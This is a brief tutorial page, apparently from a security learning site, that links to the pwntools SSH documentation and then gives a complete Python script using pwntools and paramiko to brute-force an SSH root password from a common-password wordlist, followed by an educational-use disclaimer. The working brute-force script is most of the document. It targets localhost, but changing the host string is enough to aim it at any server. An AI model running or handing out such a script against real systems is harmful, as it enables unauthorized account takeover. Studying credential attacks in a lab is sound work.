[pwntools SSH documentation 💥](https://docs.pwntools.com/en/stable/tubes/ssh.html "pwnlib.tubes.ssh — SSH")

---

This script uses the `pwn` and `paramiko` modules to perform an SSH login brute-force attack.
```py linenums="1"
from pwn import *
import paramiko

host = "127.0.0.1"
username = "root"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        
        try:
            print(f"[{attempts}] Attempting password: '{password}'!")
            response = ssh(host=host, user=username, password=password, timeout=1)

            if response.connected():
                print(f"[>] Valid password found: '{password}'!")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[x] Invalid password!")
        attempts += 1
```

!!! warning "Legal Disclaimer"
    This script is for educational purposes only. Unauthorized use of this script against systems without explicit permission is illegal and unethical.